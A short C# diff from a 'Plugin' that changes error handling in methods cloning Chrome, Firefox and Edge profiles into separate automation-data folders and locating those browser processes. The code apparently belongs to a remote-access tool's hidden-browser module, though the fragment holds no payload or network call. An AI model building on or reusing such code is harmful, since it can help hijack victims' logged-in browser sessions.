@@ -162,19 +162,15 @@ namespace Plugin
         }
 
 
-        private async Task HandleCloneChrome() 
+        private async Task HandleCloneChrome()
         {
-            if (!cloning_chrome) 
+            if (!cloning_chrome)
             {
                 cloning_chrome = true;
-                try
-                {
-                    await ProcessHandler.CloneChrome();
-                }
-                catch 
+                if (!await ProcessHandler.CloneChrome())
                 {
                     int pid = await GetProcessViaCommandLine("chrome.exe", "ChromeAutomationData");
-                    if (pid != -1) 
+                    if (pid != -1)
                     {
                         Process p = Process.GetProcessById(pid);
                         try
@@ -192,14 +188,10 @@ namespace Plugin
         }
         private async Task HandleCloneFirefox()
         {
-            if (!cloning_firefox) 
+            if (!cloning_firefox)
             {
                 cloning_firefox = true;
-                try
-                {
-                    await ProcessHandler.CloneFirefox();
-                }
-                catch
+                if (!await ProcessHandler.CloneFirefox())
                 {
                     int pid = await GetProcessViaCommandLine("firefox.exe", "FirefoxAutomationData");
                     if (pid != -1)
@@ -220,14 +212,10 @@ namespace Plugin
         }
         private async Task HandleCloneEdge()
         {
-            if (!cloning_edge) 
+            if (!cloning_edge)
             {
                 cloning_edge = true;
-                try
-                {
-                    await ProcessHandler.CloneEdge();
-                }
-                catch
+                if (!await ProcessHandler.CloneEdge())
                 {
                     int pid = await GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
                     if (pid != -1)
